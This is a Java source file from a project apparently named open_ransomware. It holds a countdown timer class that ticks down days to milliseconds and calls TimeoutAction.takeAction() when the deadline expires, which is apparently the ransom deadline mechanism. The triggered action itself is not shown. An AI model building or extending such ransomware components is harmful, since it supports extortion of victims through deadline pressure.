package com.bechris100.open_ransomware.action.timeout;

import com.bechris100.open_ransomware.SoftwareEnvironment;

import java.util.Timer;
import java.util.TimerTask;

public class Timeout {

    public static void startCountdown(TimeoutInterface tInterface) {
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (SoftwareEnvironment.Timeout.timeoutMilliseconds == 0 &&
                        SoftwareEnvironment.Timeout.timeoutSeconds == 0 &&
                        SoftwareEnvironment.Timeout.timeoutMinutes == 0 &&
                        SoftwareEnvironment.Timeout.timeoutHours == 0 &&
                        SoftwareEnvironment.Timeout.timeoutDays == 0) {
                    TimeoutAction.takeAction();
                    this.cancel();
                } else {
                    if (SoftwareEnvironment.Timeout.timeoutDays >= 1 && SoftwareEnvironment.Timeout.timeoutHours == 0) {
                        SoftwareEnvironment.Timeout.timeoutHours = 23;
                        SoftwareEnvironment.Timeout.timeoutDays--;
                    } else if (SoftwareEnvironment.Timeout.timeoutHours >= 1 && SoftwareEnvironment.Timeout.timeoutMinutes == 0) {
                        SoftwareEnvironment.Timeout.timeoutMinutes = 60;
                        SoftwareEnvironment.Timeout.timeoutHours--;
                    } else if (SoftwareEnvironment.Timeout.timeoutMinutes >= 1 && SoftwareEnvironment.Timeout.timeoutSeconds == 0) {
                        SoftwareEnvironment.Timeout.timeoutSeconds = 59;
                        SoftwareEnvironment.Timeout.timeoutMinutes--;
                    } else if (SoftwareEnvironment.Timeout.timeoutSeconds >= 1 && SoftwareEnvironment.Timeout.timeoutMilliseconds == 0) {
                        SoftwareEnvironment.Timeout.timeoutMilliseconds = 1000;
                        SoftwareEnvironment.Timeout.timeoutSeconds--;
                    } else
                        SoftwareEnvironment.Timeout.timeoutMilliseconds--;
                }

                if (tInterface != null)
                    tInterface.timeout(SoftwareEnvironment.Timeout.timeoutMilliseconds,
                            SoftwareEnvironment.Timeout.timeoutSeconds,
                            SoftwareEnvironment.Timeout.timeoutMinutes,
                            SoftwareEnvironment.Timeout.timeoutHours,
                            SoftwareEnvironment.Timeout.timeoutDays);
            }
        }, 1, 1);
    }

    public interface TimeoutInterface {
        void timeout(int milliseconds, int seconds, int minutes, int hours, int days);
    }

}
